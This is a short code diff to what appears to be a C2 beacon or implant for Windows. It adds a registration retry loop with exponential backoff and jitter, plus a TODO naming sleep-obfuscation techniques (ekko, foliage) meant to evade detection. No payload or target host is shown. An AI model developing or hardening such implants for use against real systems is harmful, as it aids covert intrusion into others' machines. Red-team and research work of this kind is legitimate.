@@ -101,6 +101,28 @@ int main(void) {
         return 1;
     }
 
+    // TODO: Add sleep obfuscation (ekko sleep, foliage, bunch of different techniques i could use)
+    int attempt = 0;
+    while (do_register(agent_id, AGENT_ID_SIZE) != 0) {
+        attempt++;
+
+        /* Exponential backoff: 5s, 10s, 20s, 40s, 80s, then capped
+            * at 5 minutes. Add jitter so multiple beacons don't all
+            * hammer the server at the same moment if the server just
+            * came back up after an outage. */
+        int base_ms = 5000;
+        for (int i = 1; i < attempt && i < 6; i++) base_ms *= 2;
+        if (base_ms > 300000) base_ms = 300000;  /* 5 min cap */
+        int jitter = rand() % (base_ms / 4 + 1);
+        int sleep_ms = base_ms + jitter;
+
+        fprintf(stderr,
+            "[!] Registration failed (attempt %d), retrying in %d ms\n",
+            attempt, sleep_ms);
+        Sleep((DWORD)sleep_ms);
+    }
+    
+
     if (do_register(agent_id, AGENT_ID_SIZE) != 0) {
         fprintf(stderr, "[!] Registration failed\n");
         shell_cleanup();
